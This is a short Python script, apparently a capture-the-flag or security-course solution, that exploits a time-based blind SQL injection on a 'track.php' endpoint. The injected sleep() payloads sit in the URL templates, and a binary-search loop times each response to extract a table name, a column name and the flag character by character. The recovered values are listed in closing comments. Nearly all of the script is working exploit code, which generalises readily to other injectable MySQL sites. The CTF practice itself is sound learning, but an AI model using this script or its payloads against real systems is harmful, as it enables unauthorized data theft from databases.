#!/usr/bin/env python3

"""
and (select if (boolean condition), sleep(), 1)
"""

import urllib.request
import time


# select table name
qr = 'http://tor.atdog.tw:8080/time/track.php?action=1%20and%20(select%20if((ascii(substr((select%20table_name%20from%20information_schema.columns%20limit%20482,1),{},1))%20>{}),sleep(2.5),1))%23'

# select column name
#qr = 'http://tor.atdog.tw:8080/time/track.php?action=1%20and%20(select%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20limit%20483,1),{},1))%20>{}),sleep(2.5),1))%23'

# select flag from what_flags
#qr = 'http://tor.atdog.tw:8080/time/track.php?action=1%20and%20(select%20if((ascii(substr((select%20flag%20from%20what_flags),{},1))%20>{}),sleep(2.5),1))%23'

ans = ''

for i in range(1, 41):
    n = 128
    a = n
    b = 0

    while b < a and b != a-1:
        t = (a + b) // 2
        print(qr.format(i, t))
        req = urllib.request.Request(qr.format(i, t))
        req.add_header('User-Agent', 'Chrome/27.0.1453.93')
        t1 = time.time()
        doc = urllib.request.urlopen(req)
        t2 = time.time()
        s = doc.read()

        if t2 - t1 > 0.5:
            b = (a + b) // 2
        else:
            a = (a + b) // 2

        print((a, b))

    ans += chr(a)
    print(ans)

print(ans)


# table name = what_flags
# column name = flag
# SecProg{why_it_took_so_long}
